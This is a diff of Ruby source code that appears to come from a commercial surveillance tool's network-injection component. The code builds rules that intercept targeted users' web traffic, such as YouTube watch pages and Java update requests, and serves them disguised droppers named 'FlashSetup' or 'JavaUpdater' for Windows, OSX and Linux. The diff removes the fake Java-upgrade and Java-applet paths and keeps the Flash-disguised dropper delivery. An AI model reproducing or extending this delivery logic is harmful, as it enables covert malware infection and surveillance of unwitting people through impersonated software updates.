@@ -22,8 +22,9 @@ class InjectorTask
     intercept_files = []
     vector_files = {}
 
-    # TODO: check for release
-    raise "Version too old, please update the component" if injector.version < 2013031101
+    raise "Cannot send rules to a Network Injector that has never synchronized with the system" if injector.version == 0
+    # TODO: check before release
+    raise "Version too old, please update the Network Injector" if injector.version < 2013111101
 
     injector.rules.where(:enabled => true).each do |rule|
 
@@ -42,7 +43,6 @@ class InjectorTask
       redirect_user["#{rule.ident} #{rule.ident_param}"] ||= tag
 
       # automatic patterns for rules
-      rule.resource = 'javadl-esd.sun.com/update/1.6.0/map*1.6.0.xml' if rule.action == 'INJECT-UPGRADE'
       rule.resource = '*.youtube.com/watch*' if rule.action == 'INJECT-HTML-FLASH'
 
       redirect_url << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.probability} #{rule.resource}"
@@ -56,16 +56,8 @@ class InjectorTask
           # generate the cooked agent
           inject_exe(intercept_files, redirect_user, rule, vector_files)
 
-=begin
-        when 'INJECT-HTML-JAVA'
-          inject_html_java(intercept_files, progressive, redirect_user, rule, vector_files)
-=end
-
         when 'INJECT-HTML-FLASH'
           inject_html_flash(intercept_files, progressive, redirect_user, rule, vector_files)
-
-        when 'INJECT-UPGRADE'
-          inject_java_upgrade(intercept_files, progressive, redirect_user, rule, vector_files)
 
       end
 
@@ -122,133 +114,90 @@ class InjectorTask
     @description = "Rules applied successfully"
   end
 
-  def inject_html_java(intercept_files, progressive, redirect_user, rule, vector_files)
-    appname = 'JwsUpdater' + progressive.to_s
-    intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
-
-    temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-    # generate the applet
-    params = {'factory' => {'_id' => rule.action_param},
-              'generate' => {'platforms' => ['osx', 'windows'],
-                             'binary' => {'demo' => LicenseManager.instance.limits[:nia][1], 'admin' => false},
-                             'melt' => {'admin' => false, 'scout' => rule.scout}
-              },
-              'melt' => {'appname' => appname, 'tni' => true}
-    }
-    build = Build.factory(:applet)
-    build.create params
-    FileUtils.cp build.path(build.outputs.first), temp_zip
-    build.clean
-
-    # extract the zip and take the applet files
-    Zip::File.open(temp_zip) do |z|
-      z.each do |f|
-        f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-        z.extract(f, f_path) unless File.exist?(f_path)
-        vector_files[f.name] = f_path
-      end
-    end
-    FileUtils.rm_rf(temp_zip)
-  end
-
-  def inject_java_upgrade(intercept_files, progressive, redirect_user, rule, vector_files)
-    appname = 'JavaUpdater' + progressive.to_s
-    intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
-
-    temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-    # generate the upgrade
-    params = {'factory' => {'_id' => rule.action_param},
-              'generate' => {'platforms' => ['windows'],
-                             'binary' => {'demo' => LicenseManager.instance.limits[:nia][1], 'admin' => false},
-                             'melt' => {'admin' => false, 'scout' => rule.scout}
-              },
-              'melt' => {'appname' => appname}
-    }
-    build = Build.factory(:upgrade)
-    build.create params
-    FileUtils.cp build.path(build.outputs.first), temp_zip
-    build.clean
-
-    # extract the zip and take the applet files
-    Zip::File.open(temp_zip) do |z|
-      z.each do |f|
-        f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-        z.extract(f, f_path) unless File.exist?(f_path)
-        vector_files[f.name] = f_path
-      end
-    end
-    FileUtils.rm_rf(temp_zip)
-  end
-
   def inject_html_flash(intercept_files, progressive, redirect_user, rule, vector_files)
-    appname = 'FlashSetup-11.8.800.' + progressive.to_s
+    appname = 'FlashSetup-' + progressive.to_s
     intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
 
-    # WINDOWS
-    temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-    # generate the dropper
-    params = {'factory' => {'_id' => rule.action_param},
-              'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-              'melt' => {'admin' => true, 'cooked' => true, 'appname' => appname, 'scout' => rule.scout}
-    }
-    build = Build.factory(:windows)
-    build.create params
-    FileUtils.cp build.path(build.outputs.first), temp_zip
-    build.clean
+    begin
+      # WINDOWS
+      temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+      # generate the dropper
+      params = {'factory' => {'_id' => rule.action_param},
+                'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
+                'melt' => {'admin' => true, 'cooked' => true, 'appname' => appname, 'scout' => rule.scout}
+      }
+      build = Build.factory(:windows)
+      build.create params
+      FileUtils.cp build.path(build.outputs.first), temp_zip
+      build.clean
 
-    # extract the zip
-    Zip::File.open(temp_zip) do |z|
-      z.each do |f|
-        f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-        z.extract(f, f_path) unless File.exist?(f_path)
-        vector_files[f.name.gsub('.cooked', '.windows')] = f_path
+      # extract the zip
+      Zip::File.open(temp_zip) do |z|
+        z.each do |f|
+          f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+          z.extract(f, f_path) unless File.exist?(f_path)
+          vector_files[f.name.gsub('.cooked', '.windows')] = f_path
+        end
       end
+      FileUtils.rm_rf(temp_zip)
+    rescue Exception => e
+      #raised if no license for that platform
+      trace :error, e.message
     end
-    FileUtils.rm_rf(temp_zip)
 
-    # OSX
-    temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-    # generate the dropper
-    params = {'factory' => {'_id' => rule.action_param},
-              'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-              'melt' => {'admin' => false, 'appname' => appname + '.osx'}
-    }
-    build = Build.factory(:osx)
-    build.create params
-    FileUtils.cp build.path(build.outputs.first), temp_zip
-    build.clean
+    begin
+      # OSX
+      temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+      # generate the dropper
+      params = {'factory' => {'_id' => rule.action_param},
+                'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
+                'melt' => {'admin' => false, 'appname' => appname + '.osx'}
+      }
+      build = Build.factory(:osx)
+      build.create params
+      FileUtils.cp build.path(build.outputs.first), temp_zip
+      build.clean
 
-    # extract the zip
-    Zip::File.open(temp_zip) do |z|
-      z.each do |f|
-        f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-        z.extract(f, f_path) unless File.exist?(f_path)
-        vector_files[f.name] = f_path
+      # extract the zip
+      Zip::File.open(temp_zip) do |z|
+        z.each do |f|
+          f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+          z.extract(f, f_path) unless File.exist?(f_path)
+          vector_files[f.name] = f_path
+        end
       end
+      FileUtils.rm_rf(temp_zip)
+    rescue Exception => e
+      #raised if no license for that platform
+      trace :error, e.message
     end
-    FileUtils.rm_rf(temp_zip)
 
-    # LINUX
-    temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-    # generate the dropper
-    params = {'factory' => {'_id' => rule.action_param},
-              'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-              'melt' => {'admin' => false, 'appname' => appname + '.linux'}
-    }
-    build = Build.factory(:linux)
-    build.create params
-    FileUtils.cp build.path(build.outputs.first), temp_zip
-    build.clean
+    begin
+      # LINUX
+      temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+      # generate the dropper
+      params = {'factory' => {'_id' => rule.action_param},
+                'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
+                'melt' => {'admin' => false, 'appname' => appname + '.linux'}
+      }
+      build = Build.factory(:linux)
+      build.create params
+      FileUtils.cp build.path(build.outputs.first), temp_zip
+      build.clean
 
-    # extract the zip
-    Zip::File.open(temp_zip) do |z|
-      z.each do |f|
-        f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-        z.extract(f, f_path) unless File.exist?(f_path)
-        vector_files[f.name] = f_path
+      # extract the zip
+      Zip::File.open(temp_zip) do |z|
+        z.each do |f|
+          f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+          z.extract(f, f_path) unless File.exist?(f_path)
+          vector_files[f.name] = f_path
+        end
       end
+      FileUtils.rm_rf(temp_zip)
+    rescue Exception => e
+      #raised if no license for that platform
+      trace :error, e.message
     end
-    FileUtils.rm_rf(temp_zip)
 
   end
 
